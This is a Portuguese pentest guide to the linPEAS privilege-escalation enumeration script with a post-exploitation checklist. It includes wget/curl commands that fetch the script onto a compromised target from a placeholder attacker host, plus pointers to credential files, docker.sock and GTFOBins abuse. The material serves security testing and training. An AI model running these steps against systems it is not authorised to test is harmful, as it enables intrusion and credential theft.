---

# 🛠️ **linPEAS.sh – Explicação Detalhada e Guia de Uso para Escalonamento de Privilégios**

## 📌 O que é o linPEAS?

O `linpeas.sh` é parte da suíte **PEASS-ng (Privilege Escalation Awesome Scripts Suite)**. Ele é um **script automatizado de enumeração de pós-exploração** para **sistemas Linux**, criado com o objetivo de **identificar vetores de escalonamento de privilégios**.

É usado por pentesters, CTF players e red teamers para acelerar a fase de **reconhecimento local** em um sistema comprometido.

---

## 🧠 Como o linPEAS funciona?

O `linpeas.sh` executa uma grande quantidade de **checks automáticos**, divididos em várias categorias. Ele busca por:

### 🔍 Informações que podem indicar falhas ou oportunidades de escalonamento, como:
- **Binários SUID/SGID incomuns**
- **Permissões incorretas em arquivos críticos**
- **Crontabs mal configurados**
- **Serviços rodando como root**
- **Tokens, credenciais, ou arquivos sensíveis**
- **Versões vulneráveis de software**
- **Caminhos de PATH manipuláveis**
- **Possibilidade de escape de restrições como chroot, Docker, LXC, etc**
- **Acesso a serviços de administração como sudoers mal configurados**
- **Acesso a scripts, binários ou backups com falhas**

Cada uma dessas descobertas vem com **dicas ou sugestões** visíveis no próprio output.

---

## 🧪 Como utilizar o linpeas.sh na prática?

### 📥 1. Transferir para o alvo

```bash
# Com wget
wget http://IP_DO_ATACANTE/linpeas.sh -O /tmp/linpeas.sh

# Com curl
curl http://IP_DO_ATACANTE/linpeas.sh -o /tmp/linpeas.sh

chmod +x /tmp/linpeas.sh
```

---

### 🚀 2. Executar o linPEAS

```bash
./linpeas.sh
# Ou:
./linpeas.sh > /tmp/saida_linpeas.txt
```

**Executar com sudo (se possível):**

```bash
sudo ./linpeas.sh
```

**Executar com bash:**

```bash
bash -c "./linpeas.sh"
```

---

## 📊 Interpretação da saída

- 🟩 Verde: Informações gerais
- 🟨 Amarelo: Algo potencialmente explorável
- 🟥 Vermelho: Alta criticidade – possível vetor direto

---

# ✅ **CHEATSHEET DE ESCALONAMENTO – linPEAS.sh**

Use essa checklist como referência rápida para análise dos resultados do linPEAS:

---

### 🔐 **Permissões Elevadas**
- [ ] `sudo -l`: comandos sudo sem senha (`NOPASSWD`)
- [ ] Binários SUID/SGID não comuns
- [ ] Capabilities incomuns (`getcap -r / 2>/dev/null`)
- [ ] `suid` com permissões write em diretórios

---

### 🧨 **Execução como Root**
- [ ] Crontabs rodando como root (scripts manipuláveis)
- [ ] Serviços iniciados como root (systemd, init.d)
- [ ] Unit files modificáveis em `/etc/systemd/system/`

---

### 🔓 **Informações Sensíveis**
- [ ] Arquivos `.bash_history`, `.ssh/`, `.aws/`, `.git/`
- [ ] Arquivos com "senha", "password", "credencial", `.env`
- [ ] Dumps de banco de dados ou arquivos `.bak`/`.old`
- [ ] Arquivos world-readable em `/home`, `/var/backups`

---

### 🧬 **Ambiente e Configuração**
- [ ] Variável de ambiente `PATH` manipulável
- [ ] Programas no PATH de usuários com write perms
- [ ] Executáveis com código em pastas `tmp`, `dev`, etc

---

### 📦 **Softwares e Versões Vulneráveis**
- [ ] Kernels vulneráveis (`uname -a`)
- [ ] Softwares desatualizados (Apache, MySQL, sudo, etc.)
- [ ] Docker mal configurado (`docker.sock`, root inside container)
- [ ] Ferramentas de backup vulneráveis (tar, rsync, cp, etc)

---

### 🧠 **Ferramentas de Abuso**
- [ ] Uso de [GTFOBins](https://gtfobins.github.io/) para explorar SUID
- [ ] Verificação de scripts com comandos externos (`sh`, `cp`, `tar`)
- [ ] Verificação com `pspy` para tarefas agendadas em tempo real

---

## 📚 Recursos complementares

- 🔗 [linPEAS GitHub (PEASS-ng)](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- 🔗 [GTFOBins](https://gtfobins.github.io/)
- 🔗 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---
